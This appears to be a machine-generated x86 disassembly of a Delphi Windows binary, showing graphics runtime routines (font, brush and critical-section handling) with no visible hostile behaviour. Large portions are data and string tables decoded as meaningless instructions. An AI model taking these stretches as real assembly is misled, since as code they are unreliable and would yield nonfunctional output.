add [ edi + edi * 8 ] dh
add [ eax ] al
push esi
inc edi
add [ 0x640000ff ] dh
push esi
inc edi
add [ esi ] dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ ebx ] bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edi + edi * 8 ] bh
add [ eax ] al
push esi
inc edi
add [ 0x640000ff ] bh
push esi
inc edi
add [ esi ] bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edi ] bh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ eax ] ah
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ ecx ] ah
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edx ] ah
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ ebx ] ah
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edi + edi * 8 ] ah
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41b095
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b09c
retn
sub_41b0a8
lodsb [ esi ]
mov al 0x41
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
or al 0xb1
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 4 ] cl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov [ edi + 0x40 ] ch
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ eax - 0x4f ] bp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4f ] ch
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov [ edi + 0x40 ] ch
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
push esp
inc esi
imul esp [ ebx + 0x4f ] 0x61726570
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
mov [ ecx + 0xa030041 ] dh
push esp
inc esi
outsd
outsb
je r-xdata
jae r-xdata
popad
insd
nop
fdiv [ ecx + 0xc010041 ]
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
clc
mov cl 0x41
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ ecx + esi * 4 + 0x66090041 ] al
jo r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
je r-xdata
popa
jne r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add ah al
mov dl 0x41
add [ edi ] al
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
mov cl 0x41
add [ ebx + 0x41b260c0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
hlt
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah dh
mov cl 0x41
add [ esi ] al
jae r-xdata
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0xb248c08b
inc ecx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ edx + esi * 4 + 0x41 ] bl
add [ edi ] al
jo r-xdata
outsd
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
pop es
jb r-xdata
insd
push edi
push 0x5657469
jo r-xdata
jo r-xdata
pop es
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x41b2c890
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4c ] dh
jae r-xdata
rol [ ebx + esi * 4 + 0xb030041 ] 0x54
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
add eax 0x6f4e6d70
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
hlt
popad
jb r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
jo r-xdata
inc esp
outsd
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 4 + 0x41 ] dl
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax + 0x70041b3 ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
push es
dec ebp
push eax
outsb
insb
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x41b1cc90
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add ah dl
inc esp
inc ecx
add ah ah
inc ebp
inc ecx
add ah ch
inc ebp
inc ecx
add [ eax ] al
inc ebp
inc ecx
inc eax
add [ eax ] bl
add [ eax ] al
add [ eax + 0x1c ] al
inc ecx
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
inc edx
jb r-xdata
mov eax eax
test [ ebx + 0xb030041 ] dh
push esp
inc edi
jb r-xdata
jb r-xdata
inc ebx
outsd
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
add [ eax ] al
cwde
mov ah 0x41
add [ eax ] ah
imul esp [ ebx + 0x73 ] 0xffff0001
nop
sbb al 0xb5
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
mov ch 0x41
add [ ebp + esi * 4 + 0x41 ] cl
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + esi * 2 - 0x4c ] si
inc ecx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
dec [ eax + 0xf0041c9 ]
jo r-xdata
dec ebp
popad
jae r-xdata
inc ecx
push 0x6c797453
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
outsb
je r-xdata
push esp
inc edi
jb r-xdata
leave
inc ecx
add [ edi ] cl
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0xb384c08b
inc ecx
dec ebp
jb r-xdata
add [ ebx ] al
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
mov ch 0x41
add [ edx - 0x4b ] al
inc ecx
add [ eax + eax ] ah
add [ eax ] al
cld
dec esp
mov ch 0x41
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + ecx * 2 - 0x4c ] si
inc ecx
add [ esp + ebx + 0x41 ] dh
or [ edi + 0x72 ] al
popad
jo r-xdata
popad
imul esp [ ebx + 0x73 ] 0x41b44890
dec eax
mov ah 0x41
add [ esp + esi * 4 + 0x41 ] bl
insb
nop
inc edi
outsd
popad
insb
dec esi
outsd
je r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
mov bl 0x41
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
imul esp [ ebx + 0x73 ] 0xc08b0000
pushfd
mov ah 0x41
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
inc eax
add [ eax - 0x1bffbe34 ] bl
inc ebp
inc ecx
add ah ch
inc ebp
inc ecx
add ah bl
int3
inc eax
add [ edx + esi ] cl
imul sp [ ebp + 0x72 ] 0x1114
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
add [ eax ] al
add [ ecx ] al
add ch bh
inc eax
int3
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x200041b4 ] bl
jo r-xdata
sub_41ba70
dec edx
mov edx 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xbb
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 4 ] bl
inc ecx
add [ ebx + edi * 4 ] ah
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax ] dh
sbb eax 0x34a00041
inc eax
add [ esi + eax * 2 + 0x34b00041 ] ah
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add ah dl
inc esp
inc ecx
add ah ah
inc ebp
inc ecx
add [ ebx + esi * 8 + 0x41 ] cl
add [ eax ] al
inc ebp
inc ecx
add [ edi + eax * 2 ] dh
inc ecx
add ah bl
inc ecx
add [ edx + ebp - 0xc67ffc0 ] cl
inc ecx
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add al ah
hlt
sub_41bc32
cld
push eax
add [ edx ] al
adc al 0x1
inc edx
add [ eax ] cl
push esp
push eax
imul esp [ ebx + 0x74 ] 0x8d657275
inc eax
add [ esp + edi * 4 + 0x41 ] cl
add [ edi ] al
or [ eax + edx * 2 + 0x69 ] dl
arpl [ ebp + esi * 2 + 0x72 ] si
or al 0xbc
inc ecx
add [ ebp + ebx + 0x41 ] dh
or [ edi + 0x72 ] al
popad
jo r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
mov esp 0x34a00041
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0x1bffbdfd ] ch
add eax [ edx ]
push cs
push esp
dec ebp
je r-xdata
imul esp [ ebx + 0x73 ] 0xb8900000
mov esp 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x80041bc
add [ eax ] al
add [ eax - 0x5fffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + ebp + 0x540c0040 ] cl
push ebx
push 0x64657261
dec ecx
insd
popad
lea eax [ bx + si ]
sbb [ ebp + 0x41 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0xbd
inc ecx
add [ eax + eax ] ah
add [ edi + eax * 2 ] dh
inc ecx
add ah bl
inc ecx
add ah dh
add al 0x42
add [ eax - 0x7bffbe0d ] bl
add eax 0x58c0042
inc edx
add al dh
add eax 0xf4e40042
inc ecx
add [ esi + eax + 0x42 ] bh
add [ edi + eax + 0x42 ] bl
add al bh
or al [ edx ]
enter 0x41f5 0x0
in al 0xb
inc edx
add al ch
or eax [ edx ]
inc eax
or eax 0x3e80042
inc edx
add al ch
hlt
imul bp [ ebp + 0x49 ] 0x616d
nop
js r-xdata
add [ edi * 4 + 0x240041 ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
mov ebp 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr [ ebp + 0x300041 ]
add [ eax ] al
insb
mov edx 0x34a00041
inc eax
add [ esi + eax * 2 + 0x34b00041 ] ah
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax ] dh
add al 0x42
add ah ah
inc ebp
inc ecx
add [ ebx + esi * 8 + 0x41 ] cl
add [ eax + 0x4 ] ah
inc edx
sub_41bee2
inc ecx
add [ eax - 0xbffbddb ] ch
sub [ edx ] eax
[ edx ] eax
les esi [ edx ]
inc edx
add ah cl
cmc
inc ecx
add al ch
xor eax [ edx ]
cmp al 0x34
inc edx
add [ esi + ebx - 0xb17ffbe ] ch
inc ecx
add [ eax - 0xb ] dh
inc ecx
add [ eax + 0x28 ] dh
inc edx
add ah bh
inc edx
add ah ch
daa
inc edx
add [ edi + esi ] al
inc edx
add [ esp + 0x251c0042 ] bh
inc edx
add [ eax + 0x7004230 ] bh
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41bf3470
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41beb870
add [ eax ] dh
mov ebx 0x41
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax * 8 + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x40 ] ah
inc ecx
add [ eax + eax ] dh
add [ eax ] al
insb
mov edx 0x34a00041
inc eax
add [ esi + eax * 2 + 0x34b00041 ] ah
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x38 ] al
inc edx
add ah ah
inc ebp
inc ecx
add [ ebx + esi * 8 + 0x41 ] cl
add [ eax + 0x38 ] dh
inc edx
add [ edi + eax * 2 ] dh
inc ecx
add ah bl
inc ecx
add al dl
cmp [ edx ] al
cwde
inc ecx
add [ eax ] dl
cmp [ edx ] eax
cmp al 0x39
inc edx
add al ah
hlt
imul esp [ ebx + 0x73 ] 0xc08b0000
mov al [ 0x41bf ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi * 4 + 0x180041 ] ah
add [ eax ] al
insb
mov esp 0x34a00041
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ edi + esi + 0x37d40042 ] ah
inc edx
add [ edx ] cl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
popad
nop
cld
mov edi 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
rol [ ecx ] 0x0
sub_41c09c
call sub_420261
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
rol [ ecx ] 0x24
add [ eax ] al
add [ eax - 0x5fffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ ecx + eax * 8 + 0x41 ] cl
add [ eax ] dl
push esp
push edx
jae r-xdata
sahf
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41c110
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_41c14c
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_41c188
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_41c0fc
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_41c170
xor edx edx
push ebp
push sub_41c25c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c263
mov eax [ ebp - 0x4 ]
call sub_41c17c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026bc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028b8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407ca8
test al al
je r-xdata
sub_41c26c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c170
xor ecx ecx
push ebp
push sub_41c2f3
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c17c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_41c31c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c170
xor eax eax
push ebp
push sub_41c385
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41c188
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41c26c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c38c
mov eax [ ebp - 0x4 ]
call sub_41c17c
retn
mov eax ebx
mov si 0xfffd
call sub_403454
sub_41c394
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c170
xor eax eax
push ebp
push sub_41c3f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c3f7
mov eax [ ebp - 0x4 ]
call sub_41c17c
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403454
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c26c
sub_41c400
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c170
xor edx edx
push ebp
push sub_41c45f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c466
mov eax [ ebp - 0x4 ]
call sub_41c17c
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_41c46c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_4142b0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c509
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413f44
mov ebx eax
mov eax ebx
call sub_41da38
inc [ ebp - 0x4 ]
mov eax ebx
call sub_41dd4c
mov eax [ rw-data ]
call sub_41c400
mov eax [ rw-data ]
call sub_41c400
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c510
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_414314
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_413f44
call sub_41dc24
inc esi
dec ebx
jne r-xdata
sub_41cb5f
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_4139f4
retn
sub_41cb90
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402d64
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402b54
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_41cc44
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41c188
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
